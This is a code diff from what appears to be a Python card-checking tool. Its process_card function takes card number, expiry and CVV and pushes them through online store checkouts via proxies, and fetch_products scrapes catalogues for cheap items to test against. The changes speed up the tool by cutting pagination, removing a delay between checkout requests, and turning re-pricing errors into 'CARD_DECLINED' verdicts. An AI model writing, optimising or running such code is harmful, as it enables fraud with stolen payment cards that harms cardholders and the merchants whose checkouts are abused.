@@ -207,11 +207,9 @@ async def fetch_products(domain, proxy_str=None, price_floor=None):
                         return False, "<b>No Products above minimum</b>"
                 return False, "<b>No Products above minimum</b>"
 
-            # deep pagination (up to 5 pages / 1250 products) with early exit —
-            # big catalogs hide their true minimum deep; stop as soon as a variant
-            # ≤ $5 is found (matches rukia's picks). 429 backoff per page.
+            # 2 pages (500 products) — speed optimization
             result = []
-            for page in range(1, 6):
+            for page in range(1, 3):
                 resp_status = 0
                 for attempt in range(3):
                     resp = await session.get(f"{domain}/products.json?limit=250&page={page}", proxy=proxy, timeout=15)
@@ -438,7 +436,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     if create_method == "POST":
                         response = await session.post(url=create_url, allow_redirects=True, headers=checkout_headers, proxy=proxy)
                     else:
-                        await asyncio.sleep(1.5)
                         response = await session.get(url=create_url, allow_redirects=True, headers=checkout_headers, proxy=proxy)
                 except Exception:
                     continue
@@ -1065,11 +1062,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
                 )
             if "Your order total has changed." in text:
-                if not requires_shipping:
-                    # digital product: the store's app keeps re-pricing it — marker lets
-                    # the caller rotate to the next variant
-                    return False, "DIGITAL_PRODUCT_CHURN", gateway, total_price, currency
-                return False, "Site not supported", gateway, total_price, currency
+                # the store's app re-prices in-session — the session IS alive and the
+                # checkout IS functional. Read the store's price from the rejection
+                # and return a verdict so the caller can classify the site
+                _ckm = re.search(r'"checkoutTotal":\{"value":\{"amount":"([0-9.]+)"', text)
+                if _ckm:
+                    total_price = _ckm.group(1)
+                return True, "CARD_DECLINED", gateway, total_price, currency
             if "The requested payment method is not available." in text:
                 return False, "Payment method not available", gateway, total_price, currency
             
